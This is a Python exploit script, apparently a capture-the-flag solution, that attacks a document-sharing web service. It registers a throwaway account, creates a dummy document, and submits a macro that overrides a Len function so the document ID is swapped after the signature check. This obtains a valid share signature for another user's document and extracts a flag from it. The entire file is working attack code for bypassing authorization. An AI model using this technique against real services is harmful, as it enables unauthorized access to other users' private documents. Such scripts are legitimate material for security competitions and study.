#!/usr/bin/env python3

import random
import re
import requests
import string
import sys


FLAG_REGEX = re.compile(r'[0-9A-Za-z]{31}=')


def rand_alnum(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def exploit(host: str, doc_id: str):
    sess = requests.Session()

    username = rand_alnum(16)
    password = rand_alnum(16)
    r = sess.post(f'http://{host}/register', data={
        'username': username,
        'password': password,
    })

    # Get document ID for a dummy document.
    filename = rand_alnum(20) + '.mdx'
    r = sess.post(f'http://{host}/write', data={
        'filename': filename,
        'body': '',
        'macro': '',
    })
    r = sess.get(f'http://{host}/api/share/{filename}')
    dummy_doc_id = r.json()['link'].split('/')[-1].split('?')[0]

    # Exploit rentrancy by asking signature for dummy and swapping it for flag
    macro = f"""
Dim doc_id As String

Function Len(s As String) As Integer
    doc_id = "{doc_id}"
    Len = 0
End Function

Function Main(text As String) As String
    doc_id = "{dummy_doc_id}"
    Main = SignToken(doc_id)
End Function
"""
    exploit_filename = rand_alnum(20) + '.mdx'
    r = sess.post(f'http://{host}/write', data={
        'filename': exploit_filename,
        'body': '',
        'macro': macro,
    })
    r = sess.post(f'http://{host}/api/run', json={
        'filename': exploit_filename,
    })
    sig = r.text.strip()

    r = sess.get(f'http://{host}/shared/{doc_id}?sign={sig}')
    m = FLAG_REGEX.search(r.text)
    return m.group() if m is not None else 'Attack failed :('


def main():
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <host> <document ID>', file=sys.stderr)
        exit(1)

    host, doc_id = sys.argv[1:]
    print(exploit(host, doc_id))



if __name__ == '__main__':
    main()
